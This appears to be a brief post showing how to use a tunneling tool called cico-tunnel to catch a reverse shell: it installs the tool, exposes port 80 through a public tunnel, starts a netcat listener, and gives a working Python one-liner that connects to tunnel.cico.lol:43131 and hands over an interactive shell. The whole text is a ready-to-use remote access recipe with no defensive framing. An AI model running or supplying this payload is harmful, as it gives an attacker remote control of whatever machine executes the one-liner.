<https://github.com/Cicodevada/cico-tunnel>

pip install cico-tunnel
cicotunnel 80
nc -lvnp 80

http://localhost:80 -> <http://tunnel.cico.lol:43131>

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("tunnel.cico.lol",43131));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

yay
